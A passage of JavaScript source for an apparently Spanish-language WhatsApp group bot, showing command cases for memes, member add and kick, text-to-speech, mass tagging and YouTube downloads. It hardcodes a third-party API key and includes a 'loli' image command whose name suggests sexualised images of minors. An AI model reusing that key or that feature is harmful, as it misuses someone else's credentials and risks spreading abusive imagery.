com/6f/8e/FB1uCVGE_o.jpg','https://images2.imgbox.com/78/ea/6w8jLmWl_o.jpg','https://images2.imgbox.com/6e/36/wor7ijwQ_o.jpg','https://images2.imgbox.com/5e/bc/etsuJ52K_o.jpg','https://images2.imgbox.com/9e/43/tzo0pFMZ_o.jpg','https://images2.imgbox.com/09/bf/AggO1Jcr_o.jpg','https://images2.imgbox.com/23/f5/tvN140i8_o.jpg','https://images2.imgbox.com/78/42/m3MUmt6o_o.jpg','https://images2.imgbox.com/70/07/X7dN5fv9_o.jpg','https://images2.imgbox.com/09/48/HljZCqSP_o.jpg','https://images2.imgbox.com/8e/5c/XoeXlTSN_o.jpg','https://images2.imgbox.com/57/b3/mY9Fhk0u_o.jpg','https://images2.imgbox.com/d1/5b/UbsCzHzo_o.jpg','https://images2.imgbox.com/c1/ff/ZhGAodII_o.jpg','https://images2.imgbox.com/af/1f/utuEZmST_o.jpg','https://images2.imgbox.com/db/e2/0jDdAjep_o.jpg','https://images2.imgbox.com/fa/05/hAqTuIBa_o.jpg','https://images2.imgbox.com/9c/fc/Vjzq2TFf_o.jpg','https://images2.imgbox.com/66/65/81dUzEj0_o.jpg','https://images2.imgbox.com/ca/1c/E10nBzdz_o.jpg','https://images2.imgbox.com/bb/a4/4J5uHI3d_o.jpg','https://images2.imgbox.com/17/69/Bvb9StKx_o.jpg','https://images2.imgbox.com/9e/35/6Cju9ROR_o.jpg','https://images2.imgbox.com/79/1d/jYVn4z4s_o.jpg','https://images2.imgbox.com/3d/e0/aNpjpVxf_o.jpg','https://images2.imgbox.com/49/31/w0WRrOio_o.jpg','https://images2.imgbox.com/65/ee/jI4w8QX1_o.jpg','https://images2.imgbox.com/e7/be/R74miqGe_o.jpg','https://images2.imgbox.com/21/d3/SAav9xDL_o.jpg','https://images2.imgbox.com/60/c1/2aUxiCXq_o.jpg','https://images2.imgbox.com/54/a8/Ii2enRtw_o.jpg','https://images2.imgbox.com/c9/11/MLUG0g4w_o.jpg','https://images2.imgbox.com/0e/9e/AIHNcCNc_o.jpg','https://images2.imgbox.com/90/d9/VeRgJv4p_o.jpg','https://images2.imgbox.com/48/24/RX6IvILG_o.jpg','https://images2.imgbox.com/91/b2/wrXgWsFa_o.jpg','https://images2.imgbox.com/96/32/hxWbnEzf_o.jpg','https://images2.imgbox.com/dd/bf/FpXG6I6Z_o.jpg','https://images2.imgbox.com/b4/46/HE9aPJaZ_o.jpg','https://images2.imgbox.com/6e/33/BZr9pKft_o.jpg','https://images2.imgbox.com/b3/d1/bbWrpvjO_o.jpg','https://images2.imgbox.com/15/b1/5evUoukA_o.jpg','https://images2.imgbox.com/4d/0a/mtlP102g_o.jpg','https://images2.imgbox.com/06/4a/9dRAczNn_o.jpg','https://images2.imgbox.com/d3/47/3AxD0CJs_o.jpg','https://images2.imgbox.com/27/85/HkZAgNl4_o.jpg','https://images2.imgbox.com/4b/ca/rsU6obtZ_o.jpg','https://images2.imgbox.com/a1/64/esqBHrF0_o.jpg','https://images2.imgbox.com/83/98/K470b5KN_o.jpg','https://images2.imgbox.com/5f/6e/nZS9sdXz_o.jpg','https://images2.imgbox.com/66/94/ettUY2G4_o.jpg','https://images2.imgbox.com/c6/a5/yLaRF0uu_o.jpg','https://images2.imgbox.com/04/5f/UrZiNb7S_o.jpg','https://images2.imgbox.com/b0/3a/S97DcOWu_o.jpg','https://images2.imgbox.com/6b/19/B1IkMKy7_o.jpg','https://images2.imgbox.com/3c/60/9LT5WyQS_o.jpg','https://images2.imgbox.com/b7/e5/LHoWbvK3_o.jpg','https://images2.imgbox.com/2e/a8/TFGPuPNW_o.jpg','https://images2.imgbox.com/c5/c5/pTpK9imc_o.jpg','https://images2.imgbox.com/46/a2/keI2ebDN_o.jpg','https://images2.imgbox.com/66/d7/drCtp06y_o.jpg','https://images2.imgbox.com/a9/72/oFBSDrai_o.jpg','https://images2.imgbox.com/40/36/Kufpu1ba_o.jpg','https://images2.imgbox.com/b4/61/X0pO1lXE_o.jpg','https://images2.imgbox.com/eb/da/M80TqKuX_o.jpg','https://images2.imgbox.com/7b/61/8hwlOQOw_o.jpg','https://images2.imgbox.com/6c/f7/j6tdP0IX_o.jpg','https://images2.imgbox.com/c7/3e/VopIAbqE_o.jpg','https://images2.imgbox.com/52/29/o5LWlFhk_o.jpg','https://images2.imgbox.com/65/f5/WViZf2th_o.jpg','https://images2.imgbox.com/93/19/h7aUHCds_o.jpg','https://images2.imgbox.com/1e/8e/OSk0Rhto_o.jpg','https://images2.imgbox.com/58/98/zWWUN1pd_o.jpg','https://images2.imgbox.com/e9/da/N8n16psC_o.jpg','https://images2.imgbox.com/b2/75/Dr7h1CRR_o.jpg','https://images2.imgbox.com/68/38/a1WLt0Ke_o.jpg','https://images2.imgbox.com/15/9d/DF0BHya9_o.jpg','https://images2.imgbox.com/20/ef/1SjotcUs_o.jpg','https://images2.imgbox.com/b5/68/DakUmQDF_o.jpg','https://images2.imgbox.com/4b/87/wDbwoUk1_o.jpg','https://images2.imgbox.com/c9/1a/4hSebrEY_o.jpg','https://images2.imgbox.com/45/50/3NUAtofd_o.jpg','https://images2.imgbox.com/d7/31/7XjzjvLU_o.jpg','https://images2.imgbox.com/3e/99/K709jKU7_o.jpg','https://images2.imgbox.com/b2/5e/gYOlYEeQ_o.jpg','https://images2.imgbox.com/bf/94/Dm88bluP_o.jpg','https://images2.imgbox.com/9a/f8/snIm4Vv0_o.jpg','https://images2.imgbox.com/ff/fc/p1LVgzF7_o.jpg','https://images2.imgbox.com/a3/20/bgmEJAol_o.jpg','https://images2.imgbox.com/76/b1/FhqJg9pO_o.jpg','https://images2.imgbox.com/8d/42/Q4Zq7m3c_o.jpg','https://images2.imgbox.com/ca/da/9ZY11dIY_o.jpg','https://images2.imgbox.com/0b/63/IHLxfMQy_o.jpg','https://images2.imgbox.com/3d/3c/gxOoJB7v_o.jpg','https://images2.imgbox.com/ba/97/RXxEq9cS_o.jpg','https://images2.imgbox.com/6a/8d/8FZ6pxjv_o.jpg','https://images2.imgbox.com/1d/69/P0RRNZmU_o.jpg','https://images2.imgbox.com/83/3e/VPTKtvUO_o.jpg','https://images2.imgbox.com/76/b2/iOefSjKU_o.jpg','https://images2.imgbox.com/09/56/GXi2EqoI_o.jpg','https://images2.imgbox.com/a3/e9/BYftGrRL_o.jpg','https://images2.imgbox.com/8b/dc/fbEnzNkf_o.jpg','https://images2.imgbox.com/3f/0a/mRUo1JQV_o.jpg','https://images2.imgbox.com/ce/15/VAz25RWi_o.jpg','https://images2.imgbox.com/22/17/TcOudYCT_o.jpg','https://images2.imgbox.com/25/c9/Ep89vp4A_o.jpg','https://images2.imgbox.com/67/3f/vZljHGL8_o.jpg','https://images2.imgbox.com/12/de/ukqVFR7Q_o.jpg','https://images2.imgbox.com/ab/01/kifti8me_o.jpg','https://images2.imgbox.com/c7/cc/Zcb45Ful_o.jpg','https://images2.imgbox.com/f0/5c/uKZ4wAej_o.jpg','https://images2.imgbox.com/d5/a8/lyk7FmXM_o.jpg','https://images2.imgbox.com/77/ba/gngBJo7g_o.jpg','https://images2.imgbox.com/0a/6b/7onMmNFc_o.jpg','https://images2.imgbox.com/c1/e7/KEvhymdH_o.jpg','https://images2.imgbox.com/0c/4e/3wBSeR5X_o.jpg','https://images2.imgbox.com/62/60/UzdKE7eR_o.jpg','https://images2.imgbox.com/01/f6/ikPhrbhD_o.jpg','https://images2.imgbox.com/ba/e9/waHRtsks_o.jpg','https://images2.imgbox.com/58/e3/X7tmbwC3_o.jpg','https://images2.imgbox.com/57/58/b9d6FQm9_o.jpg','https://images2.imgbox.com/41/e4/72GfgUCj_o.jpg','https://images2.imgbox.com/10/bf/cKPiUUHE_o.jpg','https://images2.imgbox.com/50/d0/a9xBbYZb_o.jpg','https://images2.imgbox.com/5e/7e/teQAYCV7_o.jpg','https://images2.imgbox.com/dd/d0/RyjBrbWZ_o.jpg','https://images2.imgbox.com/e5/f7/3yXMckL1_o.jpg','https://images2.imgbox.com/97/5e/3oOoSxPJ_o.jpg','https://images2.imgbox.com/b2/8a/DfRuZuba_o.jpg','https://images2.imgbox.com/80/c0/Bx9dmlQB_o.jpg','https://images2.imgbox.com/18/7b/lzo917Z1_o.jpg','https://images2.imgbox.com/b2/a4/dnlUeZjh_o.jpg','https://images2.imgbox.com/4d/c7/wa81o77K_o.jpg','https://images2.imgbox.com/42/92/241ATvJK_o.jpg','https://images2.imgbox.com/88/03/fpyy4hs6_o.jpg','https://images2.imgbox.com/23/e6/vi6Rz5CA_o.jpg','https://images2.imgbox.com/77/3a/djDiVIjG_o.jpg','https://images2.imgbox.com/a6/f1/1BKyddVR_o.jpg','https://images2.imgbox.com/0c/80/dZkDbnDF_o.jpg','https://images2.imgbox.com/00/6f/DQWVO3Z6_o.jpg','https://images2.imgbox.com/60/93/TmeBp6vi_o.jpg','https://images2.imgbox.com/27/26/h2VKImIr_o.jpg','https://images2.imgbox.com/23/3f/H8ga0V8m_o.jpg','https://images2.imgbox.com/70/6f/BaHRjqrB_o.jpg','https://images2.imgbox.com/2c/4e/FeehXabr_o.jpg','https://images2.imgbox.com/da/33/xcYBvPcx_o.jpg','https://images2.imgbox.com/bb/1c/diIHZcKk_o.jpg','https://images2.imgbox.com/e7/80/3WHUJER8_o.jpg','https://images2.imgbox.com/02/f5/51teKDaw_o.jpg','https://images2.imgbox.com/56/85/eesRZtTj_o.jpg','https://images2.imgbox.com/39/5f/iwqqVesF_o.jpg','https://images2.imgbox.com/8e/8e/Ojd5om9i_o.jpg','https://images2.imgbox.com/e3/6f/mK7GIuxP_o.jpg','https://images2.imgbox.com/22/ab/CJKsVlnM_o.jpg','https://images2.imgbox.com/1e/c1/0sfqOTvu_o.jpg','https://images2.imgbox.com/59/07/okcP5YFl_o.jpg','https://images2.imgbox.com/eb/60/dkXi73B9_o.jpg','https://images2.imgbox.com/48/59/cjYVYG9y_o.jpg','https://images2.imgbox.com/74/ce/v7w3DMdu_o.jpg','https://images2.imgbox.com/7d/c1/IGXyIIGW_o.jpg','https://images2.imgbox.com/46/ac/utlE941Y_o.jpg','https://images2.imgbox.com/64/5c/FgonOEEv_o.jpg','https://images2.imgbox.com/11/e1/47zcckbs_o.jpg','https://images2.imgbox.com/67/84/v0SUVY6s_o.jpg','https://images2.imgbox.com/0f/ea/BgaUTiQN_o.jpg','https://images2.imgbox.com/e2/c1/23PQPp5e_o.jpg','https://images2.imgbox.com/72/8c/raen33Kr_o.jpg','https://images2.imgbox.com/18/7f/OngYdhY4_o.jpg','https://images2.imgbox.com/0b/ef/QNyiV1b7_o.jpg','https://images2.imgbox.com/bb/90/D3AekLB4_o.jpg','https://images2.imgbox.com/35/6b/Q0kiiBTe_o.jpg','https://images2.imgbox.com/e4/ec/rjKSYJE8_o.jpg','https://images2.imgbox.com/7e/04/090tz21I_o.jpg','https://images2.imgbox.com/9e/6c/TTrF5Pb5_o.jpg','https://images2.imgbox.com/9f/95/M6Xm3rJv_o.jpg','https://images2.imgbox.com/36/85/1VCzuKrK_o.jpg','https://images2.imgbox.com/76/85/4y6FEFnj_o.jpg','https://images2.imgbox.com/3e/f4/WaVQ8YGO_o.jpg','https://images2.imgbox.com/84/6a/8yOlcp2i_o.jpg','https://images2.imgbox.com/19/eb/l4Ks7Le0_o.jpg','https://images2.imgbox.com/b6/dc/BtOMlAWy_o.jpg','https://images2.imgbox.com/54/44/qjq128Yf_o.jpg','https://images2.imgbox.com/16/0a/ZSRVblh8_o.jpg','https://images2.imgbox.com/d2/cc/3Rfn8ZIE_o.jpg','https://images2.imgbox.com/a6/a0/aZYCuvlE_o.jpg','https://images2.imgbox.com/6c/7d/RV2QIQ1I_o.jpg','https://images2.imgbox.com/4c/f3/H399JQA6_o.jpg','https://images2.imgbox.com/45/ba/8IVNssIn_o.jpg','https://images2.imgbox.com/e2/93/mU54EfzR_o.jpg','https://images2.imgbox.com/49/d1/5ZFBCi3I_o.jpg','https://images2.imgbox.com/89/d9/hmBaENPu_o.jpg','https://images2.imgbox.com/da/f0/khyF5UHN_o.jpg','https://images2.imgbox.com/05/d3/TvwxJExr_o.jpg','https://images2.imgbox.com/24/75/JWc6s1c0_o.jpg','https://images2.imgbox.com/ee/fd/hbsPawYA_o.jpg','https://images2.imgbox.com/49/86/3wfPLDup_o.jpg','https://images2.imgbox.com/b5/6b/SbgkZDKa_o.jpg','https://images2.imgbox.com/04/5e/wAuUS7cr_o.jpg','https://images2.imgbox.com/f8/4a/O3OpuuID_o.jpg','https://images2.imgbox.com/83/fa/RylliQ4s_o.jpg','https://images2.imgbox.com/58/8c/rgDnNR5S_o.jpg','https://images2.imgbox.com/21/c5/hbJaURfe_o.jpg','https://images2.imgbox.com/60/8e/InNixy9d_o.jpg','https://images2.imgbox.com/42/4d/NKis3ygG_o.jpg','https://images2.imgbox.com/28/66/YaHpzjyC_o.jpg','https://images2.imgbox.com/dd/a5/oaG0FcFF_o.jpg','https://images2.imgbox.com/c0/3c/a7U00Hfk_o.jpg','https://images2.imgbox.com/2d/88/xidGt7rV_o.jpg','https://images2.imgbox.com/df/01/01vH5OMn_o.jpg','https://images2.imgbox.com/b7/fc/GHWHW2Fu_o.jpg','https://images2.imgbox.com/5f/32/natNZ7nH_o.jpg','https://images2.imgbox.com/37/20/QkJZl3wu_o.jpg','https://images2.imgbox.com/8c/64/352zRrVN_o.jpg','https://images2.imgbox.com/a3/a9/5UZgVObG_o.jpg','https://images2.imgbox.com/2e/6c/vM84nswq_o.jpg','https://images2.imgbox.com/d8/3f/CKRQF0Qi_o.jpg','https://images2.imgbox.com/c0/12/tYbap12z_o.jpg','https://images2.imgbox.com/2f/d2/ymr3EXVg_o.jpg','https://images2.imgbox.com/c2/77/ErG9JVGf_o.jpg','https://images2.imgbox.com/c3/b4/WI2nP3z4_o.jpg','https://images2.imgbox.com/d9/ba/N2t62Fgn_o.jpg','https://images2.imgbox.com/50/13/GSi2Aofw_o.jpg','https://images2.imgbox.com/3c/df/t8vpcu9U_o.jpg','https://images2.imgbox.com/95/ea/A1yqgLlH_o.jpg','https://images2.imgbox.com/3b/20/bDFopHsk_o.jpg','https://images2.imgbox.com/57/f9/yy09c6mp_o.jpg','https://images2.imgbox.com/e8/17/62qNSddW_o.jpg','https://images2.imgbox.com/80/37/MyvA9c9E_o.jpg','https://images2.imgbox.com/dc/45/4Kj1FiIW_o.jpg','https://images2.imgbox.com/ff/23/JqW1uAd4_o.jpg','https://images2.imgbox.com/e1/23/3qNHKFbw_o.jpg','https://images2.imgbox.com/a4/e9/KwgkqUAc_o.jpg','https://images2.imgbox.com/76/cd/tQ9cmj4U_o.jpg','https://images2.imgbox.com/40/60/BavUco4h_o.jpg','https://images2.imgbox.com/c3/77/iSbIGsCp_o.jpg','https://images2.imgbox.com/27/b3/pLxaZxAg_o.jpg','https://images2.imgbox.com/4a/89/20P53nUi_o.jpg','https://images2.imgbox.com/8f/c1/qnTJHSJn_o.jpg','https://images2.imgbox.com/7c/64/TYBDvHxD_o.jpg','https://images2.imgbox.com/d8/f7/qSWFBZEX_o.jpg','https://images2.imgbox.com/e6/37/JJznS9Qp_o.jpg','https://images2.imgbox.com/fd/a9/U9utdDH7_o.jpg','https://images2.imgbox.com/e9/eb/vlxKDO0e_o.jpg','https://images2.imgbox.com/0a/71/77MOq0Ar_o.jpg','https://images2.imgbox.com/96/ac/iXyFLMwa_o.jpg','https://images2.imgbox.com/8c/0d/PKzf2VDX_o.jpg','https://images2.imgbox.com/9a/fd/BMCauMv9_o.jpg','https://images2.imgbox.com/e3/bc/qpeANR8Q_o.jpg','https://images2.imgbox.com/d9/3f/TVTfevuJ_o.jpg','https://images2.imgbox.com/c7/43/UQmu07Yj_o.jpg','https://images2.imgbox.com/20/c3/dhGLjmWi_o.jpg','https://images2.imgbox.com/7f/cc/TYpbtsBH_o.jpg','https://images2.imgbox.com/8f/95/RNeyPjut_o.jpg','https://images2.imgbox.com/b3/30/QGiPSuxN_o.jpg','https://images2.imgbox.com/9b/95/08rgOjpZ_o.jpg','https://images2.imgbox.com/1b/04/5Ukfj3cB_o.jpg','https://images2.imgbox.com/55/9c/5JNj2U4X_o.jpg','https://images2.imgbox.com/c6/52/raXZuh88_o.jpg','https://images2.imgbox.com/10/eb/ef0bw8G1_o.jpg','https://images2.imgbox.com/6c/91/nRFXfLcR_o.jpg','https://images2.imgbox.com/5a/b3/xq3gfNkb_o.jpg','https://images2.imgbox.com/b8/73/pB5MlHhH_o.jpg','https://images2.imgbox.com/3c/e7/NBBeyYUc_o.jpg','https://images2.imgbox.com/60/32/nxrpCXpA_o.jpg','https://images2.imgbox.com/dd/90/nVSMoFNI_o.jpg']
let mems = memess[Math.floor(Math.random() * memess.length)]
memes = await getBuffer(mems)
cnf.sendMessage(from, memes, image, {quote: mek})
addFilter(from)
break
					
case prefix+'loli':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
const vu =['https://i.ibb.co/8jMFJLS/22.jpg','https://i.ibb.co/pbJknt8/21.jpg','https://i.ibb.co/3frJKPK/20.jpg','https://i.ibb.co/WgkfC3Q/63.jpg','https://i.ibb.co/zF0fqgC/29.jpg','https://i.ibb.co/KXYsk9C/62.jpg','https://i.ibb.co/jfvgcyH/28.jpg','https://i.ibb.co/9wL1fcL/61.jpg','https://i.ibb.co/7yyB3vZ/27.jpg','https://i.ibb.co/XSJTTj5/60.jpg','https://i.ibb.co/Y0zdDjr/26.jpg','https://i.ibb.co/m9RKKr8/25.jpg','https://i.ibb.co/Gnpwyw5/24.jpg','https://i.ibb.co/vJtTs6d/23.jpg','https://i.ibb.co/TKxmb60/9.jpg','https://i.ibb.co/4Y4xVXB/55.jpg','https://i.ibb.co/Y8Z3S4W/11.jpg','https://i.ibb.co/JFkNn6M/54.jpg','https://i.ibb.co/1bxFC4R/10.jpg','https://i.ibb.co/KNWqBFz/53.jpg','https://i.ibb.co/Jpbynx5/52.jpg','https://i.ibb.co/kcWPjhf/51.jpg','https://i.ibb.co/qrVHF8H/50.jpg','https://i.ibb.co/m9ywdqR/19.jpg','https://i.ibb.co/27JC0mY/18.jpg','https://i.ibb.co/9wzz02R/17.jpg','https://i.ibb.co/sj5bDQ9/16.jpg','https://i.ibb.co/4PpYwMp/59.jpg','https://i.ibb.co/yR686k4/15.jpg','https://i.ibb.co/t4HtmB9/58.jpg','https://i.ibb.co/yBCTWg4/14.jpg','https://i.ibb.co/qyD03cF/57.jpg','https://i.ibb.co/NxMy58Z/13.jpg','https://i.ibb.co/QrHwdPZ/56.jpg','https://i.ibb.co/PG8BK52/12.jpg','https://i.ibb.co/BP0tCsG/44.jpg','https://i.ibb.co/2vsGNB5/43.jpg','https://i.ibb.co/6wnNL3f/42.jpg','https://i.ibb.co/cQ41fW1/41.jpg','https://i.ibb.co/FHhsw0z/40.jpg','https://i.ibb.co/NrXpDSn/8.jpg','https://i.ibb.co/h9cT0ZJ/7.jpg','https://i.ibb.co/PT56Dqq/6.jpg','https://i.ibb.co/dkW7ZG8/49.jpg','https://i.ibb.co/wMMN45z/5.jpg','https://i.ibb.co/nnyG8zL/48.jpg','https://i.ibb.co/RPmtr7L/4.jpg','https://i.ibb.co/SnPPfXQ/47.jpg','https://i.ibb.co/JyY7rhP/3.jpg','https://i.ibb.co/w769bF3/46.jpg','https://i.ibb.co/FW1r8JJ/2.jpg','https://i.ibb.co/7WChLwT/45.jpg','https://i.ibb.co/fpc7vrg/1.jpg','https://i.ibb.co/JtTCzqt/69.jpg','https://i.ibb.co/FsPkRQy/68.jpg','https://i.ibb.co/N2bhjmN/67.jpg','https://i.ibb.co/ctcknwP/66.jpg','https://i.ibb.co/SBD95bq/65.jpg','https://i.ibb.co/Xtn32N7/64.jpg','https://i.ibb.co/pQ1Twkh/33.jpg','https://i.ibb.co/cYfHjHv/32.jpg','https://i.ibb.co/C2ZCRMv/31.jpg','https://i.ibb.co/sJBKymV/30.jpg','https://i.ibb.co/jL3X3vL/39.jpg','https://i.ibb.co/YjjHfwv/38.jpg','https://i.ibb.co/KsDTpy1/37.jpg','https://i.ibb.co/XDGCWLq/36.jpg','https://i.ibb.co/bs0RdwX/35.jpg','https://i.ibb.co/m5dg5KG/34.jpg']
let vuvu = vu[Math.floor(Math.random() * vu.length)]
kkj = await getBuffer(vuvu)
cnf.sendMessage(from, kkj, image, {quoted: mek, caption: 'Aquí tienes 💕🦈'})
addFilter(from)
break
					
case prefix+'welcome':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isGroupAdmins) return reply(mess.only.admin)		  
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Quien eres? 7-7')
if (Number(args[0]) === 1) {
if (isWelkom) return reply('Ya activo ')
welkom.push(from)
fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
reply('Activado✔️')} 
else if (Number(args[0]) === 0) {
welkom.splice(from, 1)
fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
reply('Desactivado✔️')
} else {
reply('1 para activar, 0 para desactivar')
}
addFilter(from)
break
					
case prefix+'add':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('quien quieres añadir??')
					if (args[0].startsWith('08')) return reply('Usa el código de país')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						cnf.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('No se pudo agregar el objetivo, tal vez porque en privado')
					}
					addFilter(from)
break
					
			    case prefix+'kick':
			    if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())			  
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    if (!isGroupAdmins) return reply(mess.only.admin)		
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Orden recibida, emitida :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						cnf.groupRemove(from, mentioned)
					} else {
						mentions(`Orden recibida, emitida : @${mentioned[0].split('@')[0]}`, mentioned, true)
						cnf.groupRemove(from, mentioned)
					}
					addFilter(from)
          break 
          
					case prefix+'tts':
					if (isBanned) return  reply(mess.banned)
          
if (!isRegistered) return reply(ind.noregis())			  
					if (args.length < 1) return jere.sendMessage(from, '¿Dónde está el código de idioma??', text, {quoted: mek})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return jere.sendMessage(from, 'y el texto U.U?', text, {quoted: mek})
					dtt = body.slice(7)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('El texto es muy largo T×T')
					: gtts.save(ranm, dtt, function() {
						cnf.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})
					addFilter(from)
          break
										case prefix+'online':
										  case prefix+'listonline':
										  if (isBanned) return  reply(mess.banned)
          
if (!isRegistered) return reply(ind.noregis())			  
                if (!isGroup) return reply(`[ ❗ ] Este Comando Solo Puede Ser Usado En Grupos UnU`)
                let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
                let online = [...Object.keys(cnf.chats.get(ido).presences), cnf.user.jid]
                cnf.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
                    quoted: freply,
                    contextInfo: { mentionedJid: online }
                })
                addFilter(from)
          break

					case prefix+'notif':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isGroupAdmins) return reply(mess.only.admin)					  
if (!isGroup) return reply(mess.only.group)
teks = `Notificacion Dada Por: @${sender.split("@")[0]}\n*El mensaje es: ${body.slice(7)}*`
group = await cnf.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
  jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
  text: teks,
  contextInfo: {
mentionedJid: jids
  },
  quoted: freply
}
await cnf.sendMessage(from, options, text)
addFilter(from)
          break
				
case prefix+'abrazar':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())		
	
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')  
const abra = ['ab1','ab2','ab3','ab4','ab5','ab6','ab7','ab8','ab9','ab10']
	const abras = abra[Math.floor(Math.random() * abra.length)]				
				result = fs.readFileSync(`./sticker/reac/abra/${abras}.mp4`)
cnf.sendMessage(from, result, video, { caption: `${pushname} está abrazando a @${mentioned[0].split('@')[0]}`})
				addFilter(from)
          break

case prefix+'patear':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())		
	
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')  
const pat = ['pat1','pat2','pat3','pat4','pat5']
	const pate = pat[Math.floor(Math.random() * pat.length)]				
				result = fs.readFileSync(`./sticker/reac/patad/${pate}.mp4`)
cnf.sendMessage(from, result, video, { caption: `${pushname} a pateado a @${mentioned[0].split('@')[0]}`})
				addFilter(from)
          break

case prefix+'palmaditas':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())		
	
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')  
const palm = ['pal1','pal2','pal3','pal4','pal5','pal6','pal7']
	const palma = palm[Math.floor(Math.random() * palm.length)]				
				result = fs.readFileSync(`./sticker/reac/palm/${palma}.mp4`)
cnf.sendMessage(from, result, video, { caption: `${pushname} le esta dando unas palmaditas a @${mentioned[0].split('@')[0]}`})
				addFilter(from)
          break

			
case prefix+'besar':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())			

mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')  
const bes = ['bes1','bes2','bes3','bes4','bes5','bes6','bes7']
	const beso = bes[Math.floor(Math.random() * bes.length)]				
				result = fs.readFileSync(`./sticker/reac/beso/${beso}.mp4`)
cnf.sendMessage(from, result, video, { caption: `${pushname} esta besando a @${mentioned[0].split('@')[0]}`})
				addFilter(from)
          break

				case prefix+'play':
				if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())			  
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
  if (args.length < 1) return reply('Coloca el enlace de la canción!')
  
  play = body.slice(6)
  
  anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=oCHDwj8ggZGBGjU5WIaK5Rctu6c`)
  if (anu.error) return reply(anu.error)
  infomp3 = `❒═════❬ *𝐏𝐋𝐀𝐘* ❭═════╾❒
├‣ *Nombre* : 
┴
${anu.result.title}
┬
├‣ *Fuente* : 
┴
${anu.result.source}
┬
├‣ *Tamaño* : 
┴
${anu.result.size}
┬
├‣ *Link* :
┴
*${anu.result.url_audio}
┬
❒═════════════════╾❒`
  buffer = await getBuffer(anu.result.thumbnail)
  lagu = await getBuffer(anu.result.url_audio)
  cnf.sendMessage(from, buffer, image, {
quoted: mek, caption: infomp3 })
  cnf.sendMessage(from, lagu, audio, {
mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})

  addFilter(from)
          break

case prefix+'play2':  
if (isBanned) return  reply(mess.banned) 
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)	
				  if (args.length < 1) return reply('Coloca el enlace del video!')
                cnf.sendMessage(from, mess.wait, text,{quoted : freply})
				play = args.join(" ")
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=oCHDwj8ggZGBGjU5WIaK5Rctu6c`)
				if (anu.error) return reply(anu.error)
				infomp3 = `❒════❬ *𝐏𝐋𝐀𝐘𝟐* ❭═════╾❒
├‣ *Nombre* : ${anu.result.title}
├‣ *Fuente* : ${anu.result.source}
├‣ *Tamaño* : ${anu.result.size}
❒═════════════════╾❒`			
				buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				cnf.sendMessage(from, buffer, image, {quoted: freply, caption: infomp3})
				cnf.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:freply, caption: 'Aquí tienes 💕🦈'})
					addFilter(from)
          break 
  
case prefix+'charlie':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	

if (args.length < 1) return reply('*Has tu pregunta!*')		  
const ch =['Si','No','No','Si','Si']
    const cha = ch[Math.floor(Math.random() * ch.length)]
reply(`𝐂𝐡𝐚𝐫𝐥𝐢𝐞 𝐂𝐡𝐚𝐫𝐥𝐢𝐞

𝐑𝐞𝐬𝐩𝐮𝐞𝐬𝐭𝐚 : ${cha}`)
addFilter(from)
          break

case prefix+'slot':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
const pb = ['100','50','50','50']
const pv = pb[Math.floor(Math.random() * pb.length)]
const pn = [`${pv}`]


const prd = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍊 : 🍒 : 🍒',
